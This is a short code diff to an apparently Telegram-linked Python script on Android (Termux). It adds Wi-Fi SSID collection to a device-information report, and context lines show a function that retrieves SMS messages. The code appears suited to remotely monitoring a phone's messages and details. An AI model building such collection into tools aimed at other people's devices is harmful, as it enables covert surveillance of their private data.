@@ -49,6 +49,16 @@ def get_sms():
     except Exception as e:
         return f"Error retrieving SMS: {str(e)}"
 
+# Function to get Wi-Fi connection information
+def get_wifi_info():
+    try:
+        wifi_info = subprocess.check_output(['termux-wifi-connectioninfo']).decode().strip()
+        wifi_data = json.loads(wifi_info)
+        ssid = wifi_data.get("ssid", "Not connected")
+        return f"Wi-Fi SSID: {ssid}"
+    except Exception as e:
+        return "Unable to retrieve Wi-Fi information."
+
 # Function to get device information
 def get_device_info():
     try:
@@ -71,12 +81,8 @@ def get_device_info():
         battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
         device_info['Battery'] = battery_status
 
-        # Get IP Address using termux command
-        try:
-            ip_address = subprocess.check_output(['termux-wifi-info']).decode().strip()
-            device_info['IP Address'] = ip_address
-        except Exception:
-            device_info['IP Address'] = "Unable to retrieve IP address."
+        # Get Wi-Fi information
+        device_info['Wi-Fi'] = get_wifi_info()
 
         # Format the device info for Telegram
         info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
